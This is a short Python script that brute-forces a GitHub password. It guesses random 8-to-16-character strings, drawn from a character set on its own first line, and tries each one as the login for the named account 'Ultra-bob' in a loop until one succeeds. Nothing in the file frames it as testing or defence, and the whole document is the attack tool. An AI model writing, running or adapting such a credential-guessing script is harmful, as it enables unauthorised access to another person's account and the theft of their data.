#qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@$%^*_-?.
from random import randint, choice
from github import Github
import requests
attempted=["test"]
with open("legalmethods.py","r") as file:letters=(file.readlines()[0]).strip()
trying=1
guessNum=0
while trying:
	guessNum+=1
	password="test"
	while password in attempted:
		password = ''.join([choice(letters) for _ in range(randint(8,16))])
	attempted.append(password)
	print(f"Attempt #{guessNum}: {password}")
	try:
		data=[(s.name, s.name) for s in Github('Ultra-bob', password).get_user().get_repos()]
		print(f"Password Found:\n{password}")
		trying=0
	except:
		pass